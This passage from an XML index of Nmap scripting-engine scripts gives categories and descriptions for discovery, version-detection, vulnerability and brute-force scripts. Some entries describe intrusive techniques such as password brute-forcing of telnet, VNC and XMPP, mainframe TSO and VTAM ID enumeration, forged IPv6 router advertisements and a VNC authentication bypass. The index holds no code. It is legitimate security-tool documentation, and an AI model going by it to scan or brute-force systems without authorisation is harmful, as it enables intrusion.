<script filename="E:\Software\Nmap/scripts\targets-ipv6-multicast-slaac.nse">
<categories><category>discovery</category><category>broadcast</category></categories>
<description>Performs IPv6 host discovery by triggering stateless address auto-configuration&#xa;(SLAAC).&#xa;&#xa;This script works by sending an ICMPv6 Router Advertisement with a random&#xa;address prefix, which causes hosts to begin SLAAC and send a solicitation for&#xa;their newly configured address, as part of duplicate address detection. The&#xa;script then guesses the remote addresses by combining the link-local prefix of&#xa;the interface with the interface identifier in each of the received&#xa;solicitations. This should be followed up with ordinary ND host discovery to&#xa;verify that the guessed addresses are correct.&#xa;&#xa;The router advertisement has a router lifetime of zero and a short prefix&#xa;lifetime (a few seconds)&#xa;&#xa;See also:&#xa;* RFC 4862, IPv6 Stateless Address Autoconfiguration, especially section 5.5.3.&#xa;* https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/discovery/ipv6_neighbor_router_advertisement.rb&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\targets-ipv6-wordlist.nse">
<categories><category>discovery</category></categories>
<description>Adds IPv6 addresses to the scan queue using a wordlist of hexadecimal &quot;words&quot;&#xa;that form addresses in a given subnet.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\targets-sniffer.nse">
<categories><category>broadcast</category><category>discovery</category><category>safe</category></categories>
<description>Sniffs the local network for a configurable amount of time (10 seconds&#xa;by default) and prints discovered addresses. If the&#xa;&lt;code&gt;newtargets&lt;/code&gt; script argument is set, discovered addresses&#xa;are added to the scan queue.&#xa;&#xa;Requires root privileges. Either the &lt;code&gt;targets-sniffer.iface&lt;/code&gt; script&#xa;argument or &lt;code&gt;-e&lt;/code&gt; Nmap option to define which interface to use.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\targets-traceroute.nse">
<categories><category>safe</category><category>discovery</category></categories>
<description>Inserts traceroute hops into the Nmap scanning queue. It only functions if&#xa;Nmap&apos;s &lt;code&gt;-&#45;traceroute&lt;/code&gt; option is used and the &lt;code&gt;newtargets&lt;/code&gt;&#xa;script argument is given.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\targets-xml.nse">
<categories><category>safe</category></categories>
<description>Loads addresses from an Nmap XML output file for scanning.&#xa;&#xa;Address type (IPv4 or IPv6) is determined according to whether -6 is specified to nmap.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\teamspeak2-version.nse">
<categories><category>version</category></categories>
<description>Detects the TeamSpeak 2 voice communication server and attempts to determine&#xa;version and configuration information.&#xa;&#xa;A single UDP packet (a login request) is sent. If the server does not have a&#xa;password set, the exact version, name, and OS type will also be reported on.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\telnet-brute.nse">
<categories><category>brute</category><category>intrusive</category></categories>
<description>Performs brute-force password auditing against telnet servers.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\telnet-encryption.nse">
<categories><category>safe</category><category>discovery</category></categories>
<description>Determines whether the encryption option is supported on a remote telnet&#xa;server.  Some systems (including FreeBSD and the krb5 telnetd available in many&#xa;Linux distributions) implement this option incorrectly, leading to a remote&#xa;root vulnerability. This script currently only tests whether encryption is&#xa;supported, not for that particular vulnerability.&#xa;&#xa;References:&#xa;* FreeBSD Advisory: http://lists.freebsd.org/pipermail/freebsd-announce/2011-December/001398.html&#xa;* FreeBSD Exploit: http://www.exploit-db.com/exploits/18280/&#xa;* RedHat Enterprise Linux Advisory: https://rhn.redhat.com/errata/RHSA-2011-1854.html&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\telnet-ntlm-info.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>This script enumerates information from remote Microsoft Telnet services with NTLM&#xa;authentication enabled.&#xa;&#xa;Sending a MS-TNAP NTLM authentication request with null credentials will cause the&#xa;remote service to respond with a NTLMSSP message disclosing information to include&#xa;NetBIOS, DNS, and OS build version.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\tftp-enum.nse">
<categories><category>discovery</category><category>intrusive</category></categories>
<description>Enumerates TFTP (trivial file transfer protocol) filenames by testing&#xa;for a list of common ones.&#xa;&#xa;TFTP doesn&apos;t provide directory listings. This script tries to retrieve&#xa;filenames from a list. The list is composed of static names from the&#xa;file &lt;code&gt;tftplist.txt&lt;/code&gt;, plus configuration filenames for Cisco&#xa;devices that change based on the target address, of the form&#xa;&lt;code&gt;A.B.C.X-confg&lt;/code&gt; for an IP address A.B.C.D and for X in 0 to&#xa;255.&#xa;&#xa;Use the &lt;code&gt;tftp-enum.filelist&lt;/code&gt; script argument to search for&#xa;other static filenames.&#xa;&#xa;This script is a reimplementation of tftptheft from&#xa;http://code.google.com/p/tftptheft/.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\tftp-version.nse">
<categories><category>default</category><category>safe</category><category>version</category></categories>
<description>Obtains information (such as vendor and device type where available) from a&#xa;TFTP service by requesting a random filename. Software vendor information is&#xa;determined by matching the error message against a database of known software.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\tls-alpn.nse">
<categories><category>discovery</category><category>safe</category><category>default</category></categories>
<description>Enumerates a TLS server&apos;s supported application-layer protocols using the ALPN protocol.&#xa;&#xa;Repeated queries are sent to determine which of the registered protocols are supported.&#xa;&#xa;For more information, see:&#xa;* https://tools.ietf.org/html/rfc7301&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\tls-nextprotoneg.nse">
<categories><category>discovery</category><category>safe</category><category>default</category></categories>
<description>Enumerates a TLS server&apos;s supported protocols by using the next protocol&#xa;negotiation extension.&#xa;&#xa;This works by adding the next protocol negotiation extension in the client&#xa;hello packet and parsing the returned server hello&apos;s NPN extension data.&#xa;&#xa;For more information, see:&#xa;* https://tools.ietf.org/html/draft-agl-tls-nextprotoneg-03&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\tls-ticketbleed.nse">
<categories><category>vuln</category><category>safe</category></categories>
<description>Detects whether a server is vulnerable to the F5 Ticketbleed bug (CVE-2016-9244).&#xa;&#xa;For additional information:&#xa;* https://filippo.io/Ticketbleed/&#xa;* https://blog.filippo.io/finding-ticketbleed/&#xa;* https://support.f5.com/csp/article/K05121675&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\tn3270-screen.nse">
<categories><category>safe</category><category>discovery</category></categories>
<description>Connects to a tn3270 &apos;server&apos; and returns the screen.&#xa;&#xa;Hidden fields will be listed below the screen with (row, col) coordinates.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\tor-consensus-checker.nse">
<categories><category>external</category><category>safe</category></categories>
<description>Checks if a target is a known Tor node.&#xa;&#xa;The script works by querying the Tor directory authorities. Initially,&#xa;the script stores all IPs of Tor nodes in a lookup table to reduce the&#xa;number of requests and make lookups quicker.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\traceroute-geolocation.nse">
<categories><category>safe</category><category>external</category><category>discovery</category></categories>
<description>Lists the geographic locations of each hop in a traceroute and optionally&#xa;saves the results to a KML file, plottable on Google earth and maps.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\tso-brute.nse">
<categories><category>intrusive</category></categories>
<description>TSO account brute forcer.&#xa;&#xa;This script relies on the NSE TN3270 library which emulates a&#xa;TN3270 screen for NMAP.&#xa;&#xa;TSO user IDs have the following rules:&#xa; - it cannot begin with a number&#xa; - only contains alpha-numeric characters and @, #, $.&#xa; - it cannot be longer than 7 chars&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\tso-enum.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>TSO User ID enumerator for IBM mainframes (z/OS). The TSO logon panel&#xa;tells you when a user ID is valid or invalid with the message:&#xa; &lt;code&gt;IKJ56420I Userid &lt;user ID&gt; not authorized to use TSO&lt;/code&gt;.&#xa;&#xa;The TSO logon process can work in two ways:&#xa;1) You get prompted with &lt;code&gt;IKJ56700A ENTER USERID -&lt;/code&gt;&#xa;   to which you reply with the user you want to use.&#xa;   If the user ID is valid it will give you a normal&#xa;   TSO logon screen. Otherwise it will give you the&#xa;   screen logon error above.&#xa;2) You&apos;re given the TSO logon panel and enter your user ID&#xa;   at the &lt;code&gt;Userid    ===&gt;&lt;/code&gt; prompt. If you give&#xa;   it an invalid user ID you receive the error message above.&#xa;&#xa;This script relies on the NSE TN3270 library which emulates a&#xa;TN3270 screen for NMAP.&#xa;&#xa;TSO user IDs have the following rules:&#xa; - it cannot begin with a number&#xa; - only contains alpha-numeric characters and @, #, $.&#xa; - it cannot be longer than 7 chars&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ubiquiti-discovery.nse">
<categories><category>default</category><category>discovery</category><category>version</category><category>safe</category></categories>
<description>Extracts information from Ubiquiti networking devices.&#xa;&#xa;This script leverages Ubiquiti&apos;s Discovery Service which is enabled by default&#xa;on many products. It will attempt to leverage version 1 of the protocol first&#xa;and, if that fails, attempt version 2.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\unittest.nse">
<categories><category>safe</category></categories>
<description>Runs unit tests on all NSE libraries.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\unusual-port.nse">
<categories><category>safe</category></categories>
<description>Compares the detected service on a port against the expected service for that&#xa;port number (e.g. ssh on 22, http on 80) and reports deviations. The script&#xa;requires that a version scan has been run in order to be able to discover what&#xa;service is actually running on each port.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\upnp-info.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Attempts to extract system information from the UPnP service.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\uptime-agent-info.nse">
<categories><category>safe</category><category>default</category></categories>
<description>Gets system information from an Idera Uptime Infrastructure Monitor agent.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\url-snarf.nse">
<categories><category>safe</category></categories>
<description>Sniffs an interface for HTTP traffic and dumps any URLs, and their&#xa;originating IP address. Script output differs from other script as&#xa;URLs are written to stdout directly. There is also an option to log&#xa;the results to file.&#xa;&#xa;The script can be limited in time by using the timeout argument or run until a&#xa;ctrl+break is issued, by setting the timeout to 0.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ventrilo-info.nse">
<categories><category>default</category><category>discovery</category><category>safe</category><category>version</category></categories>
<description>Detects the Ventrilo voice communication server service versions 2.1.2&#xa;and above and tries to determine version and configuration&#xa;information. Some of the older versions (pre 3.0.0) may not have the&#xa;UDP service that this probe relies on enabled by default.&#xa;&#xa;The Ventrilo server listens on a TCP (voice/control) and an UDP (ping/status)&#xa;port with the same port number (fixed to 3784 in the free version, otherwise&#xa;configurable). This script activates on both a TCP and UDP port version scan.&#xa;In both cases probe data is sent only to the UDP port because it allows for a&#xa;simple and informative status command as implemented by the&#xa;&lt;code&gt;ventrilo_status.exe&lt;/code&gt; executable which has shipped alongside the Windows server&#xa;package since version 2.1.2 when the UDP status service was implemented.&#xa;&#xa;When run as a version detection script (&lt;code&gt;-sV&lt;/code&gt;), the script will report on the&#xa;server version, name, uptime, authentication scheme, and OS.  When run&#xa;explicitly (&lt;code&gt;-&#45;script ventrilo-info&lt;/code&gt;), the script will additionally report on the&#xa;server name phonetic pronunciation string, the server comment, maximum number&#xa;of clients, voice codec, voice format, channel and client counts, and details&#xa;about channels and currently connected clients.&#xa;&#xa;Original reversing of the protocol was done by Luigi Auriemma&#xa;(http://aluigi.altervista.org/papers.htm#ventrilo).&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\versant-info.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Extracts information, including file paths, version and database names from&#xa;a Versant object database.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\vmauthd-brute.nse">
<categories><category>brute</category><category>intrusive</category></categories>
<description>Performs brute force password auditing against the VMWare Authentication Daemon (vmware-authd).&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\vmware-version.nse">
<categories><category>discovery</category><category>safe</category><category>version</category></categories>
<description>Queries VMware server (vCenter, ESX, ESXi) SOAP API to extract the version information.&#xa;&#xa;The same script as VMware Fingerprinter from VASTO created by Claudio Criscione, Paolo Canaletti&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\vnc-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Performs brute force password auditing against VNC servers.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\vnc-info.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Queries a VNC server for its protocol version and supported security types.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\vnc-title.nse">
<categories><category>intrusive</category><category>discovery</category></categories>
<description>Tries to log into a VNC server and get its desktop name. Uses credentials&#xa;discovered by vnc-brute, or None authentication types. If&#xa;&lt;code&gt;realvnc-auth-bypass&lt;/code&gt; was run and returned VULNERABLE, this script&#xa;will use that vulnerability to bypass authentication.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\voldemort-info.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Retrieves cluster and store information from the Voldemort distributed key-value store using the Voldemort Native Protocol.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\vtam-enum.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Many mainframes use VTAM screens to connect to various applications&#xa;(CICS, IMS, TSO, and many more).&#xa;&#xa;This script attempts to brute force those VTAM application IDs.&#xa;&#xa;This script is based on mainframe_brute by Dominic White&#xa;(https://github.com/sensepost/mainframe_brute). However, this script&#xa;doesn&apos;t rely on any third party libraries or tools and instead uses&#xa;the NSE TN3270 library which emulates a TN3270 screen in lua.&#xa;&#xa;Application IDs only allows for 8 byte IDs, that is the only specific rule&#xa;found for application IDs.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\vulners.nse">
<categories><category>vuln</category><category>safe</category><category>external</category></categories>
<description>For each available CPE the script prints out known vulns (links to the correspondent info) and correspondent CVSS scores.&#xa;&#xa;Its work is pretty simple:&#xa;* work only when some software version is identified for an open port&#xa;* take all the known CPEs for that software (from the standard nmap -sV output)&#xa;* make a request to a remote server (vulners.com API) to learn whether any known vulns exist for that CPE&#xa;* if no info is found this way, try to get it using the software name alone&#xa;* print the obtained info out&#xa;&#xa;NB:&#xa;Since the size of the DB with all the vulns is more than 250GB there is no way to use a local db.&#xa;So we do make requests to a remote service. Still all the requests contain just two fields - the&#xa;software name and its version (or CPE), so one can still have the desired privacy.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\vuze-dht-info.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Retrieves some basic information, including protocol version from a Vuze filesharing node.&#xa;&#xa;As Vuze doesn&apos;t have a default port for its DHT service, this script has&#xa;some difficulties in determining when to run. Most scripts are triggered by&#xa;either a default port or a fingerprinted service. To get around this, there&#xa;are two options:&#xa;1. Always run a version scan, to identify the vuze-dht service in order to&#xa;   trigger the script.&#xa;2. Force the script to run against each port by setting the argument&#xa;   vuze-dht-info.allports&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\wdb-version.nse">
<categories><category>default</category><category>safe</category><category>version</category><category>discovery</category><category>vuln</category></categories>
<description>Detects vulnerabilities and gathers information (such as version&#xa;numbers and hardware support) from VxWorks Wind DeBug agents.&#xa;&#xa;Wind DeBug is a SunRPC-type service that is enabled by default on many devices&#xa;that use the popular VxWorks real-time embedded operating system. H.D. Moore&#xa;of Metasploit has identified several security vulnerabilities and design flaws&#xa;with the service, including weakly-hashed passwords and raw memory dumping.&#xa;&#xa;See also:&#xa;http://www.kb.cert.org/vuls/id/362332&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\weblogic-t3-info.nse">
<categories><category>default</category><category>safe</category><category>discovery</category><category>version</category></categories>
<description>Detect the T3 RMI protocol and Weblogic version</description>
</script>
<script filename="E:\Software\Nmap/scripts\whois-domain.nse">
<categories><category>discovery</category><category>external</category><category>safe</category></categories>
<description>Attempts to retrieve information about the domain name of the target&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\whois-ip.nse">
<categories><category>discovery</category><category>external</category><category>safe</category></categories>
<description>Queries the WHOIS services of Regional Internet Registries (RIR) and attempts to retrieve information about the IP Address&#xa;Assignment which contains the Target IP Address.&#xa;&#xa;The fields displayed contain information about the assignment and the organisation responsible for managing the address&#xa;space. When output verbosity is requested on the Nmap command line (&lt;code&gt;-v&lt;/code&gt;) extra information about the assignment will&#xa;be displayed.&#xa;&#xa;To determine which of the RIRs to query for a given Target IP Address this script utilises Assignments Data hosted by IANA.&#xa;The data is cached locally and then parsed for use as a lookup table.  The locally cached files are refreshed periodically&#xa;to help ensure the data is current.  If, for any reason, these files are not available to the script then a default sequence&#xa;of Whois services are queried in turn until: the desired record is found; or a referral to another (defined) Whois service is&#xa;found; or until the sequence is exhausted without finding either a referral or the desired record.&#xa;&#xa;The script will recognize a referral to another Whois service if that service is defined in the script and will continue by&#xa;sending a query to the referred service.  A record is assumed to be the desired one if it does not contain a referral.&#xa;&#xa;To reduce the number unnecessary queries sent to Whois services a record cache is employed and the entries in the cache can be&#xa;applied to any targets within the range of addresses represented in the record.&#xa;&#xa;In certain circumstances, the ability to cache responses prevents the discovery of other, smaller IP address assignments&#xa;applicable to the target because a cached response is accepted in preference to sending a Whois query.  When it is important&#xa;to ensure that the most accurate information about the IP address assignment is retrieved the script argument &lt;code&gt;whodb&lt;/code&gt;&#xa;should be used with a value of &lt;code&gt;&quot;nocache&quot;&lt;/code&gt; (see script arguments).  This reduces the range of addresses that may use a&#xa;cached record to a size that helps ensure that smaller assignments will be discovered.  This option should be used with caution&#xa;due to the potential to send large numbers of whois queries and possibly be banned from using the services.&#xa;&#xa;In using this script your IP address will be sent to iana.org. Additionally&#xa;your address and the address of the target of the scan will be sent to one of&#xa;the RIRs.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\wsdd-discover.nse">
<categories><category>safe</category><category>discovery</category><category>default</category></categories>
<description>Retrieves and displays information from devices supporting the Web&#xa;Services Dynamic Discovery (WS-Discovery) protocol. It also attempts&#xa;to locate any published Windows Communication Framework (WCF) web&#xa;services (.NET 4.0 or later).&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\x11-access.nse">
<categories><category>default</category><category>safe</category><category>auth</category></categories>
<description>Checks if you&apos;re allowed to connect to the X server.&#xa;&#xa;If the X server is listening on TCP port 6000+n (where n is the display&#xa;number), it is possible to check if you&apos;re able to get connected to the&#xa;remote display by sending a X11 initial connection request.&#xa;&#xa;In reply, the success byte (0x00 or 0x01) will determine if you are in&#xa;the &lt;code&gt;xhost +&lt;/code&gt; list. In this case, script will display the message:&#xa;&lt;code&gt;X server access is granted&lt;/code&gt;.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\xdmcp-discover.nse">
<categories><category>safe</category><category>discovery</category></categories>
<description>Requests an XDMCP (X display manager control protocol) session and lists supported authentication and authorization mechanisms.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\xmlrpc-methods.nse">
<categories><category>default</category><category>safe</category><category>discovery</category></categories>
<description>Performs XMLRPC Introspection via the system.listMethods method.&#xa;&#xa;If the verbosity is &gt; 1 then the script fetches the response&#xa;of system.methodHelp for each method returned by listMethods.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\xmpp-brute.nse">
<categories><category>brute</category><category>intrusive</category></categories>
<description>Performs brute force password auditing against XMPP (Jabber) instant messaging servers.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\xmpp-info.nse">
<categories><category>default</category><category>safe</category><category>discovery</category><category>version</category></categories>
<description>Connects to XMPP server (port 5222) and collects server information such as:&#xa;supported auth mechanisms, compression methods, whether TLS is supported&#xa;and mandatory, stream management, language, support of In-Band registration,&#xa;server capabilities.  If possible, studies server vendor.&#xa;</description>
</script>
</nse-scripts>
